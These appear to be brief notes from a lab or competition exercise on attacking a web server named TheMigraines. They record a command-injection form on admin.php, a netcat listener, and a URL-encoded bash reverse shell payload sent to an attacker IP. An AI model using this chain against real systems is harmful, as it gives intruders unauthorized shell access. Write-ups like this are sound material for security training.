Attacked TheMigraines

- Grabbed the IP address of the machine and navigated to it in a browser.
- Found their website.
- Navigated to <ip address>/admin.php
    - Was able to execute commands through the form found on admin.php
    - whoami: www-data
- in a kali terminal, executed: 
nc -lvnp 4444

- then in the browser, navigated to:
http://<TARGET IP>/admin.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER IP>/4444%200%3E%261%22
